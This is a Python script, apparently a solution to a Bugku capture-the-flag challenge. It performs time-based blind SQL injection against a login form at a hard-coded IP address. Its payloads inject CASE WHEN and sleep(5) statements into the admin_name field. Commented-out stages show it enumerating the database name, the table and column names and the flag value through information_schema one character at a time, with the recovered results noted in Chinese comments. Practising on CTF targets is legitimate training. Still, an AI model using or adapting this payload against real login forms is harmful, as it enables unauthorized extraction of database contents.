import requests

url = "http://123.206.87.240:9001/sql/index.php"
meta_word = "abcdefghijklmnopqrstuvwxyz0123456789,_{@#$%&*}"


def cala_length():
    for index in  range(0,59):
        try:
            #playload = "0\" or case when((select length(database()))={0})then(sleep(5))else(select 1)end or \"0 ".format(index)
            # 数据库名称长度：9
            # playload = "0\" or case when((select length((select group_concat(table_name)from information_schema.tables where table_schema=database())))={0})then(sleep(5))else(select 1)end or \"0 ".format(index)
            # 当前数据库下所有表的名长度：12
            #playload = "0\" or case when((select length((select group_concat(column_name)from information_schema.columns where table_name='flag1')))={0})then(sleep(5))else(select 1)end or \"0 ".format(index)
            # 列名的长度： 5
            playload = "0\" or case when((select length((select group_concat(flag1) from  flag1 )))={0})then(sleep(5))else(select 1)end or \"0 ".format(index)
            # flag1列下的值的长度：32
            requests.post(url, data={"admin_name":playload, "admin_passwd":"123456", "submit":"GO GO GO"}, timeout=3)
        except Exception:
            print(index)
            break


def cala_name():
    last_result = ""
    for index in range(1,33):
        for i in meta_word:
            try:
                
                # playload = "0\" or case when((select substring(database()from {0} for 1))='{1}')then(sleep(5))else(select 1)end or \"0 ".format(index, i)
                # 当前数据库： bugkusql1
                # playload = "0\" or case when((select substring((select group_concat(table_name)from information_schema.tables where table_schema=database())from {0} for 1))='{1}')then(sleep(5))else(select 1)end or \"0 ".format(index, i)
                # 当前数据库下的表名： flag1,whoami
                # playload = "0\" or case when((select substring((select group_concat(column_name)from information_schema.columns where table_name='flag1')from {0} for 1))='{1}')then(sleep(5))else(select 1)end or \"0 ".format(index, i)
                # 列名 ：flag1
                playload = "0\" or case when((select substring((select group_concat(flag1) from  flag1 )from {0} for 1))='{1}')then(sleep(5))else(select 1)end or \"0 ".format(index, i)
                #  flag1表 flag1列的值： ed6b28e684817d9efcaf802979e57aea
                requests.post(url, data={"admin_name":playload, "admin_passwd":"123456", "submit":"GO GO GO"}, timeout=3)
                # print(playload)
            except Exception:
                print(i)
                last_result += i
                break
        print("position: {0}".format(index))
    print(last_result)


if __name__ == "__main__":
    # cala_length()
    cala_name()
         



   